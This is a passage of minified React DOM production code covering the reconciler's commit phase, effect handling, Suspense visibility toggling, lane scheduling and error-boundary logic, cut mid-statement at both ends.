ie(n),null;if(r=(n.flags&128)!==0,o=l.rendering,o===null)if(r)Ct(l,!1);else{if(X!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(o=oi(e),o!==null){for(n.flags|=128,Ct(l,!1),r=o.updateQueue,r!==null&&(n.updateQueue=r,n.flags|=4),n.subtreeFlags=0,r=t,t=n.child;t!==null;)l=t,e=r,l.flags&=14680066,o=l.alternate,o===null?(l.childLanes=0,l.lanes=e,l.child=null,l.subtreeFlags=0,l.memoizedProps=null,l.memoizedState=null,l.updateQueue=null,l.dependencies=null,l.stateNode=null):(l.childLanes=o.childLanes,l.lanes=o.lanes,l.child=o.child,l.subtreeFlags=0,l.deletions=null,l.memoizedProps=o.memoizedProps,l.memoizedState=o.memoizedState,l.updateQueue=o.updateQueue,l.type=o.type,e=o.dependencies,l.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return I(F,F.current&1|2),n.child}e=e.sibling}l.tail!==null&&G()>pt&&(n.flags|=128,r=!0,Ct(l,!1),n.lanes=4194304)}else{if(!r)if(e=oi(o),e!==null){if(n.flags|=128,r=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),Ct(l,!0),l.tail===null&&l.tailMode==="hidden"&&!o.alternate&&!B)return ie(n),null}else 2*G()-l.renderingStartTime>pt&&t!==1073741824&&(n.flags|=128,r=!0,Ct(l,!1),n.lanes=4194304);l.isBackwards?(o.sibling=n.child,n.child=o):(t=l.last,t!==null?t.sibling=o:n.child=o,l.last=o)}return l.tail!==null?(n=l.tail,l.rendering=n,l.tail=n.sibling,l.renderingStartTime=G(),n.sibling=null,t=F.current,I(F,r?t&1|2:t&1),n):(ie(n),null);case 22:case 23:return $o(),r=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==r&&(n.flags|=8192),r&&n.mode&1?ve&1073741824&&(ie(n),n.subtreeFlags&6&&(n.flags|=8192)):ie(n),null;case 24:return null;case 25:return null}throw Error(S(156,n.tag))}function ap(e,n){switch(Co(n),n.tag){case 1:return he(n.type)&&Zr(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return dt(),z(pe),z(oe),Ao(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return Ro(n),null;case 13:if(z(F),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(S(340));ut()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return z(F),null;case 4:return dt(),null;case 10:return No(n.type._context),null;case 22:case 23:return $o(),null;case 24:return null;default:return null}}var Nr=!1,le=!1,up=typeof WeakSet=="function"?WeakSet:Set,_=null;function Zn(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(r){W(e,n,r)}else t.current=null}function Gl(e,n,t){try{t()}catch(r){W(e,n,r)}}var na=!1;function cp(e,n){if(Nl=Yr,e=bu(),bo(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var r=t.getSelection&&t.getSelection();if(r&&r.rangeCount!==0){t=r.anchorNode;var i=r.anchorOffset,l=r.focusNode;r=r.focusOffset;try{t.nodeType,l.nodeType}catch{t=null;break e}var o=0,s=-1,a=-1,d=0,m=0,h=e,g=null;n:for(;;){for(var k;h!==t||i!==0&&h.nodeType!==3||(s=o+i),h!==l||r!==0&&h.nodeType!==3||(a=o+r),h.nodeType===3&&(o+=h.nodeValue.length),(k=h.firstChild)!==null;)g=h,h=k;for(;;){if(h===e)break n;if(g===t&&++d===i&&(s=o),g===l&&++m===r&&(a=o),(k=h.nextSibling)!==null)break;h=g,g=h.parentNode}h=k}t=s===-1||a===-1?null:{start:s,end:a}}else t=null}t=t||{start:0,end:0}}else t=null;for(Ll={focusedElem:e,selectionRange:t},Yr=!1,_=n;_!==null;)if(n=_,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,_=e;else for(;_!==null;){n=_;try{var w=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(w!==null){var x=w.memoizedProps,C=w.memoizedState,p=n.stateNode,c=p.getSnapshotBeforeUpdate(n.elementType===n.type?x:Le(n.type,x),C);p.__reactInternalSnapshotBeforeUpdate=c}break;case 3:var f=n.stateNode.containerInfo;f.nodeType===1?f.textContent="":f.nodeType===9&&f.documentElement&&f.removeChild(f.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(S(163))}}catch(v){W(n,n.return,v)}if(e=n.sibling,e!==null){e.return=n.return,_=e;break}_=n.return}return w=na,na=!1,w}function Dt(e,n,t){var r=n.updateQueue;if(r=r!==null?r.lastEffect:null,r!==null){var i=r=r.next;do{if((i.tag&e)===e){var l=i.destroy;i.destroy=void 0,l!==void 0&&Gl(n,t,l)}i=i.next}while(i!==r)}}function Ei(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var r=t.create;t.destroy=r()}t=t.next}while(t!==n)}}function Ql(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function wc(e){var n=e.alternate;n!==null&&(e.alternate=null,wc(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[ze],delete n[Xt],delete n[Rl],delete n[Gf],delete n[Qf])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function kc(e){return e.tag===5||e.tag===3||e.tag===4}function ta(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||kc(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Kl(e,n,t){var r=e.tag;if(r===5||r===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Jr));else if(r!==4&&(e=e.child,e!==null))for(Kl(e,n,t),e=e.sibling;e!==null;)Kl(e,n,t),e=e.sibling}function Yl(e,n,t){var r=e.tag;if(r===5||r===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(r!==4&&(e=e.child,e!==null))for(Yl(e,n,t),e=e.sibling;e!==null;)Yl(e,n,t),e=e.sibling}var ee=null,je=!1;function Ze(e,n,t){for(t=t.child;t!==null;)xc(e,n,t),t=t.sibling}function xc(e,n,t){if(Be&&typeof Be.onCommitFiberUnmount=="function")try{Be.onCommitFiberUnmount(gi,t)}catch{}switch(t.tag){case 5:le||Zn(t,n);case 6:var r=ee,i=je;ee=null,Ze(e,n,t),ee=r,je=i,ee!==null&&(je?(e=ee,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):ee.removeChild(t.stateNode));break;case 18:ee!==null&&(je?(e=ee,t=t.stateNode,e.nodeType===8?qi(e.parentNode,t):e.nodeType===1&&qi(e,t),$t(e)):qi(ee,t.stateNode));break;case 4:r=ee,i=je,ee=t.stateNode.containerInfo,je=!0,Ze(e,n,t),ee=r,je=i;break;case 0:case 11:case 14:case 15:if(!le&&(r=t.updateQueue,r!==null&&(r=r.lastEffect,r!==null))){i=r=r.next;do{var l=i,o=l.destroy;l=l.tag,o!==void 0&&(l&2||l&4)&&Gl(t,n,o),i=i.next}while(i!==r)}Ze(e,n,t);break;case 1:if(!le&&(Zn(t,n),r=t.stateNode,typeof r.componentWillUnmount=="function"))try{r.props=t.memoizedProps,r.state=t.memoizedState,r.componentWillUnmount()}catch(s){W(t,n,s)}Ze(e,n,t);break;case 21:Ze(e,n,t);break;case 22:t.mode&1?(le=(r=le)||t.memoizedState!==null,Ze(e,n,t),le=r):Ze(e,n,t);break;default:Ze(e,n,t)}}function ra(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new up),n.forEach(function(r){var i=wp.bind(null,e,r);t.has(r)||(t.add(r),r.then(i,i))})}}function Ne(e,n){var t=n.deletions;if(t!==null)for(var r=0;r<t.length;r++){var i=t[r];try{var l=e,o=n,s=o;e:for(;s!==null;){switch(s.tag){case 5:ee=s.stateNode,je=!1;break e;case 3:ee=s.stateNode.containerInfo,je=!0;break e;case 4:ee=s.stateNode.containerInfo,je=!0;break e}s=s.return}if(ee===null)throw Error(S(160));xc(l,o,i),ee=null,je=!1;var a=i.alternate;a!==null&&(a.return=null),i.return=null}catch(d){W(i,n,d)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)Sc(n,e),n=n.sibling}function Sc(e,n){var t=e.alternate,r=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(Ne(n,e),Ie(e),r&4){try{Dt(3,e,e.return),Ei(3,e)}catch(x){W(e,e.return,x)}try{Dt(5,e,e.return)}catch(x){W(e,e.return,x)}}break;case 1:Ne(n,e),Ie(e),r&512&&t!==null&&Zn(t,t.return);break;case 5:if(Ne(n,e),Ie(e),r&512&&t!==null&&Zn(t,t.return),e.flags&32){var i=e.stateNode;try{Ft(i,"")}catch(x){W(e,e.return,x)}}if(r&4&&(i=e.stateNode,i!=null)){var l=e.memoizedProps,o=t!==null?t.memoizedProps:l,s=e.type,a=e.updateQueue;if(e.updateQueue=null,a!==null)try{s==="input"&&l.type==="radio"&&l.name!=null&&Wa(i,l),wl(s,o);var d=wl(s,l);for(o=0;o<a.length;o+=2){var m=a[o],h=a[o+1];m==="style"?Ya(i,h):m==="dangerouslySetInnerHTML"?Qa(i,h):m==="children"?Ft(i,h):uo(i,m,h,d)}switch(s){case"input":hl(i,l);break;case"textarea":$a(i,l);break;case"select":var g=i._wrapperState.wasMultiple;i._wrapperState.wasMultiple=!!l.multiple;var k=l.value;k!=null?nt(i,!!l.multiple,k,!1):g!==!!l.multiple&&(l.defaultValue!=null?nt(i,!!l.multiple,l.defaultValue,!0):nt(i,!!l.multiple,l.multiple?[]:"",!1))}i[Xt]=l}catch(x){W(e,e.return,x)}}break;case 6:if(Ne(n,e),Ie(e),r&4){if(e.stateNode===null)throw Error(S(162));i=e.stateNode,l=e.memoizedProps;try{i.nodeValue=l}catch(x){W(e,e.return,x)}}break;case 3:if(Ne(n,e),Ie(e),r&4&&t!==null&&t.memoizedState.isDehydrated)try{$t(n.containerInfo)}catch(x){W(e,e.return,x)}break;case 4:Ne(n,e),Ie(e);break;case 13:Ne(n,e),Ie(e),i=e.child,i.flags&8192&&(l=i.memoizedState!==null,i.stateNode.isHidden=l,!l||i.alternate!==null&&i.alternate.memoizedState!==null||(Vo=G())),r&4&&ra(e);break;case 22:if(m=t!==null&&t.memoizedState!==null,e.mode&1?(le=(d=le)||m,Ne(n,e),le=d):Ne(n,e),Ie(e),r&8192){if(d=e.memoizedState!==null,(e.stateNode.isHidden=d)&&!m&&e.mode&1)for(_=e,m=e.child;m!==null;){for(h=_=m;_!==null;){switch(g=_,k=g.child,g.tag){case 0:case 11:case 14:case 15:Dt(4,g,g.return);break;case 1:Zn(g,g.return);var w=g.stateNode;if(typeof w.componentWillUnmount=="function"){r=g,t=g.return;try{n=r,w.props=n.memoizedProps,w.state=n.memoizedState,w.componentWillUnmount()}catch(x){W(r,t,x)}}break;case 5:Zn(g,g.return);break;case 22:if(g.memoizedState!==null){la(h);continue}}k!==null?(k.return=g,_=k):la(h)}m=m.sibling}e:for(m=null,h=e;;){if(h.tag===5){if(m===null){m=h;try{i=h.stateNode,d?(l=i.style,typeof l.setProperty=="function"?l.setProperty("display","none","important"):l.display="none"):(s=h.stateNode,a=h.memoizedProps.style,o=a!=null&&a.hasOwnProperty("display")?a.display:null,s.style.display=Ka("display",o))}catch(x){W(e,e.return,x)}}}else if(h.tag===6){if(m===null)try{h.stateNode.nodeValue=d?"":h.memoizedProps}catch(x){W(e,e.return,x)}}else if((h.tag!==22&&h.tag!==23||h.memoizedState===null||h===e)&&h.child!==null){h.child.return=h,h=h.child;continue}if(h===e)break e;for(;h.sibling===null;){if(h.return===null||h.return===e)break e;m===h&&(m=null),h=h.return}m===h&&(m=null),h.sibling.return=h.return,h=h.sibling}}break;case 19:Ne(n,e),Ie(e),r&4&&ra(e);break;case 21:break;default:Ne(n,e),Ie(e)}}function Ie(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(kc(t)){var r=t;break e}t=t.return}throw Error(S(160))}switch(r.tag){case 5:var i=r.stateNode;r.flags&32&&(Ft(i,""),r.flags&=-33);var l=ta(e);Yl(e,l,i);break;case 3:case 4:var o=r.stateNode.containerInfo,s=ta(e);Kl(e,s,o);break;default:throw Error(S(161))}}catch(a){W(e,e.return,a)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function dp(e,n,t){_=e,bc(e)}function bc(e,n,t){for(var r=(e.mode&1)!==0;_!==null;){var i=_,l=i.child;if(i.tag===22&&r){var o=i.memoizedState!==null||Nr;if(!o){var s=i.alternate,a=s!==null&&s.memoizedState!==null||le;s=Nr;var d=le;if(Nr=o,(le=a)&&!d)for(_=i;_!==null;)o=_,a=o.child,o.tag===22&&o.memoizedState!==null?oa(i):a!==null?(a.return=o,_=a):oa(i);for(;l!==null;)_=l,bc(l),l=l.sibling;_=i,Nr=s,le=d}ia(e)}else i.subtreeFlags&8772&&l!==null?(l.return=i,_=l):ia(e)}}function ia(e){for(;_!==null;){var n=_;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:le||Ei(5,n);break;case 1:var r=n.stateNode;if(n.flags&4&&!le)if(t===null)r.componentDidMount();else{var i=n.elementType===n.type?t.memoizedProps:Le(n.type,t.memoizedProps);r.componentDidUpdate(i,t.memoizedState,r.__reactInternalSnapshotBeforeUpdate)}var l=n.updateQueue;l!==null&&Hs(n,l,r);break;case 3:var o=n.updateQueue;if(o!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}Hs(n,o,t)}break;case 5:var s=n.stateNode;if(t===null&&n.flags&4){t=s;var a=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":a.autoFocus&&t.focus();break;case"img":a.src&&(t.src=a.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var d=n.alternate;if(d!==null){var m=d.memoizedState;if(m!==null){var h=m.dehydrated;h!==null&&$t(h)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(S(163))}le||n.flags&512&&Ql(n)}catch(g){W(n,n.return,g)}}if(n===e){_=null;break}if(t=n.sibling,t!==null){t.return=n.return,_=t;break}_=n.return}}function la(e){for(;_!==null;){var n=_;if(n===e){_=null;break}var t=n.sibling;if(t!==null){t.return=n.return,_=t;break}_=n.return}}function oa(e){for(;_!==null;){var n=_;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{Ei(4,n)}catch(a){W(n,t,a)}break;case 1:var r=n.stateNode;if(typeof r.componentDidMount=="function"){var i=n.return;try{r.componentDidMount()}catch(a){W(n,i,a)}}var l=n.return;try{Ql(n)}catch(a){W(n,l,a)}break;case 5:var o=n.return;try{Ql(n)}catch(a){W(n,o,a)}}}catch(a){W(n,n.return,a)}if(n===e){_=null;break}var s=n.sibling;if(s!==null){s.return=n.return,_=s;break}_=n.return}}var fp=Math.ceil,ui=Je.ReactCurrentDispatcher,Fo=Je.ReactCurrentOwner,Te=Je.ReactCurrentBatchConfig,A=0,Z=null,Q=null,ne=0,ve=0,et=kn(0),X=0,tr=null,Dn=0,Ci=0,Ho=0,zt=null,de=null,Vo=0,pt=1/0,He=null,ci=!1,Xl=null,pn=null,Lr=!1,on=null,di=0,Bt=0,ql=null,Fr=-1,Hr=0;function ae(){return A&6?G():Fr!==-1?Fr:Fr=G()}function hn(e){return e.mode&1?A&2&&ne!==0?ne&-ne:Yf.transition!==null?(Hr===0&&(Hr=su()),Hr):(e=M,e!==0||(e=window.event,e=e===void 0?16:hu(e.type)),e):1}function Ae(e,n,t,r){if(50<Bt)throw Bt=0,ql=null,Error(S(185));sr(e,t,r),(!(A&2)||e!==Z)&&(e===Z&&(!(A&2)&&(Ci|=t),X===4&&rn(e,ne)),me(e,r),t===1&&A===0&&!(n.mode&1)&&(pt=G()+500,xi&&xn()))}function me(e,n){var t=e.callbackNode;Kd(e,n);var r=Kr(e,e===Z?ne:0);if(r===0)t!==null&&ms(t),e.callbackNode=null,e.callbackPriority=0;else if(n=r&-r,e.callbackPriority!==n){if(t!=null&&ms(t),n===1)e.tag===0?Kf(sa.bind(null,e)):Ru(sa.bind(null,e)),Wf(function(){!(A&6)&&xn()}),t=null;else{switch(au(r)){case 1:t=mo;break;case 4:t=lu;break;case 16:t=Qr;break;case 536870912:t=ou;break;default:t=Qr}t=jc(t,Ec.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function Ec(e,n){if(Fr=-1,Hr=0,A&6)throw Error(S(327));var t=e.callbackNode;if(ot()&&e.callbackNode!==t)return null;var r=Kr(e,e===Z?ne:0);if(r===0)return null;if(r&30||r&e.expiredLanes||n)n=fi(e,r);else{n=r;var i=A;A|=2;var l=Tc();(Z!==e||ne!==n)&&(He=null,pt=G()+500,On(e,n));do try{mp();break}catch(s){Cc(e,s)}while(!0);Po(),ui.current=l,A=i,Q!==null?n=0:(Z=null,ne=0,n=X)}if(n!==0){if(n===2&&(i=El(e),i!==0&&(r=i,n=Jl(e,i))),n===1)throw t=tr,On(e,0),rn(e,r),me(e,G()),t;if(n===6)rn(e,r);else{if(i=e.current.alternate,!(r&30)&&!pp(i)&&(n=fi(e,r),n===2&&(l=El(e),l!==0&&(r=l,n=Jl(e,l))),n===1))throw t=tr,On(e,0),rn(e,r),me(e,G()),t;switch(e.finishedWork=i,e.finishedLanes=r,n){case 0:case 1:throw Error(S(345));case 2:_n(e,de,He);break;case 3:if(rn(e,r),(r&130023424)===r&&(n=Vo+500-G(),10<n)){if(Kr(e,0)!==0)break;if(i=e.suspendedLanes,(i&r)!==r){ae(),e.pingedLanes|=e.suspendedLanes&i;break}e.timeoutHandle=Ol(_n.bind(null,e,de,He),n);break}_n(e,de,He);break;case 4:if(rn(e,r),(r&4194240)===r)break;for(n=e.eventTimes,i=-1;0<r;){var o=31-Re(r);l=1<<o,o=n[o],o>i&&(i=o),r&=~l}if(r=i,r=G()-r,r=(120>r?120:480>r?480:1080>r?1080:1920>r?1920:3e3>r?3e3:4320>r?4320:1960*fp(r/1960))-r,10<r){e.timeoutHandle=Ol(_n.bind(null,e,de,He),r);break}_n(e,de,He);break;case 5:_n(e,de,He);break;default:throw Error(S(329))}}}return me(e,G()),e.callbackNode===t?Ec.bind(null,e):null}function Jl(e,n){var t=zt;return e.current.memoizedState.isDehydrated&&(On(e,n).flags|=256),e=fi(e,n),e!==2&&(n=de,de=t,n!==null&&Zl(n)),e}function Zl(e){de===null?de=e:de.push.apply(de,e)}function pp(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var r=0;r<t.length;r++){var i=t[r],l=i.getSnapshot;i=i.value;try{if(!Me(l(),i))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function rn(e,n){for(n&=~Ho,n&=~Ci,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-Re(n),r=1<<t;e[t]=-1,n&=~r}}function sa(e){if(A&6)throw Error(S(327));ot();var n=Kr(e,0);if(!(n&1))return me(e,G()),null;var t=fi(e,n);if(e.tag!==0&&t===2){var r=El(e);r!==0&&(n=r,t=Jl(e,r))}if(t===1)throw t=tr,On(e,0),rn(e,n),me(e,G()),t;if(t===6)throw Error(S(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,_n(e,de,He),me(e,G()),null}function Wo(e,n){var t=A;A|=1;try{return e(n)}finally{A=t,A===0&&(pt=G()+500,xi&&xn())}}function zn(e){on!==null&&on.tag===0&&!(A&6)&&ot();var n=A;A|=1;var t=Te.transition,r=M;try{if(Te.transition=null,M=1,e)return e()}finally{M=r,Te.transition=t,A=n,!(A&6)&&xn()}}function $o(){ve=et.current,z(et)}function On(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Vf(t)),Q!==null)for(t=Q.return;t!==null;){var r=t;switch(Co(r),r.tag){case 1:r=r.type.childContextTypes,r!=null&&Zr();break;case 3:dt(),z(pe),z(oe),Ao();break;case 5:Ro(r);break;case 4:dt();break;case 13:z(F);break;case 19:z(F);break;case 10:No(r.type._context);break;case 22:case 23:$o()}t=t.return}if(Z=e,Q=e=mn(e.current,null),ne=ve=n,X=0,tr=null,Ho=Ci=Dn=0,de=zt=null,Ln!==null){for(n=0;n<Ln.length;n++)if(t=Ln[n],r=t.interleaved,r!==null){t.interleaved=null;var i=r.next,l=t.pending;if(l!==null){var o=l.next;l.next=i,r.next=o}t.pending=r}Ln=null}return e}function Cc(e,n){do{var t=Q;try{if(Po(),zr.current=ai,si){for(var r=H.memoizedState;r!==null;){var i=r.queue;i!==null&&(i.pending=null),r=r.next}si=!1}if(In=0,J=Y=H=null,It=!1,Zt=0,Fo.current=null,t===null||t.return===null){X=1,tr=n,Q=null;break}e:{var l=e,o=t.return,s=t,a=n;if(n=ne,s.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){var d=a,m=s,h=m.tag;if(!(m.mode&1)&&(h===0||h===11||h===15)){var g=m.alternate;g?(m.updateQueue=g.updateQueue,m.memoizedState=g.memoizedState,m.lanes=g.lanes):(m.updateQueue=null,m.memoizedState=null)}var k=Ks(o);if(k!==null){k.flags&=-257,Ys(k,o,s,l,n),k.mode&1&&Qs(l,d,n),n=k,a=d;var w=n.updateQueue;if(w===null){var x=new Set;x.add(a),n.updateQueue=x}else w.add(a);break e}else{if(!(n&1)){Qs(l,d,n),Go();break e}a=Error(S(426))}}else if(B&&s.mode&1){var C=Ks(o);if(C!==null){!(C.flags&65536)&&(C.flags|=256),Ys(C,o,s,l,n),To(ft(a,s));break e}}l=a=ft(a,s),X!==4&&(X=2),zt===null?zt=[l]:zt.push(l),l=o;do{switch(l.tag){case 3:l.flags|=65536,n&=-n,l.lanes|=n;var p=ac(l,a,n);Fs(l,p);break e;case 1:s=a;var c=l.type,f=l.stateNode;if(!(l.flags&128)&&(typeof c.getDerivedStateFromError=="function"||f!==null&&typeof f.componentDidCatch=="function"&&(pn===null||!pn.has(f)))){l.flags|=65536,n&=-n,l.lanes|=n;var v=uc(l,s,n);Fs(l,v);break e}}l=l.return}while(l!==null)}Pc(t)}catch(y){n=y,Q===t&&t!==null&&(Q=t=t.return);continue}break}while(!0)}function Tc(){var e=ui.current;return ui.current=ai,e===null?ai:e}function Go(){(X===0||X===3||X===2)&&(X=4),Z===null||!(Dn&268435455)&&!(Ci&268435455)||rn(Z,ne)}function fi(e,n){var t=A;A|=2;var r=Tc();(Z!==e||ne!==n)&&(He=null,On(e,n));do try{hp();break}catch(i){Cc(e,i)}while(!0);if(Po(),A=t,ui.current=r,Q!==null)throw Error(S(261));return Z=null,ne=0,X}function hp(){for(;Q!==null;)_c(Q)}function mp(){for(;Q!==null&&!Bd();)_c(Q)}function _c(e){var n=Lc(e.alternate,e,ve);e.memoizedProps=e.pendingProps,n===null?Pc(e):Q=n,Fo.current=null}function Pc(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=ap(t,n),t!==null){t.flags&=32767,Q=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{X=6,Q=null;return}}else if(t=sp(t,n,ve),t!==null){Q=t;return}if(n=n.sibling,n!==null){Q=n;return}Q=n=e}while(n!==null);X===0&&(X=5)}function _n(e,n,t){var r=M,i=Te.transition;try{Te.transition=null,M=1,gp(e,n,t,r)}finally{Te.transition=i,M=r}return null}function gp(e,n,t,r){do ot();while(on!==null);if(A&6)throw Error(S(327));t=e.finishedWork;var i=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(S(177));e.callbackNode=null,e.callbackPriority=0;var l=t.lanes|t.childLanes;if(Yd(e,l),e===Z&&(Q=Z=null,ne=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||Lr||(Lr=!0,jc(Qr,function(){return ot(),null})),l=(t.flags&15990)!==0,t.subtreeFlags&15990||l){l=Te.transition,Te.transition=null;var o=M;M=1;var s=A;A|=4,Fo.current=null,cp(e,t),Sc(t,e),If(Ll),Yr=!!Nl,Ll=Nl=null,e.current=t,dp(t),Ud(),A=s,M=o,Te.transition=l}else e.current=t;if(Lr&&(Lr=!1,on=e,di=i),l=e.pendingLanes,l===0&&(pn=null),Vd(t.stateNode),me(e,G()),n!==null)for(r=e.onRecoverableError,t=0;t<n.length;t++)i=n[t],r(i.value,{componentStack:i.stack,digest:i.digest});if(ci)throw ci=!1,e=Xl,Xl=null,e;return di&1&&e.tag!==0&&ot(),l=e.pendingLanes,l&1?e===ql?Bt++:(Bt=0,ql=e):Bt=0,xn(),null}function ot(){if(on!==null){var e=au(di),n=Te.transition,t=M;try{if(Te.transition=null,M=16>e?16:e,on===null)var r=!1;else{if(e=on,on=null,di=0,A&6)throw Error(S(331));var i=A;for(A|=4,_=e.current;_!==null;){var l=_,o=l.child;if(_.flags&16){var s=l.deletions;if(s!==null){for(var a=0;a<s.length;a++){var d=s[a];for(_=d;_!==null;){var m=_;switch(m.tag){case 0:case 11:case 15:Dt(8,m,l)}var h=m.child;if(h!==null)h.return=m,_=h;else for(;_!==null;){m=_;var g=m.sibling,k=m.return;if(wc(m),m===d){_=null;break}if(g!==null){g.return=k,_=g;break}_=k}}}var w=l.alternate;if(w!==null){var x=w.child;if(x!==null){w.child=null;do{var C=x.sibling;x.sibling=null,x=C}while(x!==null)}}_=l}}if(l.subtreeFlags&2064&&o!==null)o.return=l,_=o;else e:for(;_!==null;){if(l=_,l.flags&2048)switch(l.tag){case 0:case 11:case 15:Dt(9,l,l.return)}var p=l.sibling;if(p!==null){p.return=l.return,_=p;break e}_=l.return}}var c=e.current;for(_=c;_!==null;){o=_;var f=o.child;if(o.subtreeFlags&2064&&f!==null)f.return=o,_=f;else e:for(o=c;_!==null;){if(s=_,s.flags&2048)try{switch(s.tag){case 0:case 11:case 15:Ei(9,s)}}catch(y){W(s,s.return,y)}if(s===o){_=null;break e}var v=s.sibling;if(v!==null){v.return=s.return,_=v;break e}_=s.return}}if(A=i,xn(),Be&&typeof Be.onPostCommitFiberRoot=="function")try{Be.onPostCommitFiberRoot(gi,e)}catch{}r=!0}return r}finally{M=t,Te.transition=n}}return!1}function aa(e,n,t){n=ft(t,n),n=ac(e,n,1),e=fn(e,n,1),n=ae(),e!==null&&(sr(e,1,n),me(e,n))}function W(e,n,t){if(e.tag===3)aa(e,e,t);else for(;n!==null;){if(n.tag===3){aa(n,e,t);break}else if(n.tag===1){var r=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof r.componentDidCatch=="function"&&(pn===null||!pn.has(r))){e=ft(t,e),e=uc(n,e,1),n=fn(n,e,1),e=ae(),n!==null&&(sr(n,1,e),me(n,e));break}}n=n.return}}function vp(e,n,t){var r=e.pingCache;r!==null&&r.delete(n),n=ae(),e.pingedLanes|=e.suspendedLanes&t,Z===e&&(ne&t)===t&&(X===4||X===3&&(ne&130023424)===ne&&500>G()-Vo?On(e,0):Ho|=t),me(e,n)}function Nc(e,n){n===0&&(e.mode&1?(n=kr,kr<<=1,!(kr&130023424)&&(kr=4194304)):n=1);var t=ae();e=Xe(e,n),e!==null&&(sr(e,n,t),me(e,t))}function yp(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),Nc(e,t)}function wp(e,n){var t=0;switch(e.tag){case 13:var r=e.stateNode,i=e.memoizedState;i!==null&&(t=i.retryLane);break;case 19:r=e.stateNode;break;default:throw Error(S(314))}r!==null&&r.delete(n),Nc(e,t)}var Lc;Lc=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||pe.current)fe=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return fe=!1,op(e,n,t);fe=!!(e.flags&131072)}else fe=!1,B&&n.flags&1048576&&Au(n,ti,n.index);switch(n.lanes=0,n.tag){case 2:var r=n.type;Ur(e,n),e=n.pendingProps;var i=at(n,oe.current);lt(n,t),i=Io(null,n,r,e,i,t);var l=Do();return n.flags|=1,typeof i=="object"&&i!==null&&typeof i.render=="function"&&i.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,he(r)?(l=!0,ei(n)):l=!1,n.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,jo(n),i.updater=bi,n.stateNode=i,i._reactInternals=n,Bl(n,r,e,t),n=Hl(null,n,r,!0,l,t)):(n.tag=0,B&&l&&Eo(n),se(null,n,i,t),n=n.child),n;case 16:r=n.elementType;e:{switch(Ur(e,n),e=n.pendingProps,i=r._init,r=i(r._payload),n.type=r,i=n.tag=xp(r),e=Le(r,e),i){case 0:n=Fl(null,n,r,e,t);break e;case 1:n=Js(null,n,r,e,t);break e;case 11:n=Xs(null,n,r,e,t);break e;case 14:n=qs(null,n,r,Le(r.type,e),t);break e}throw 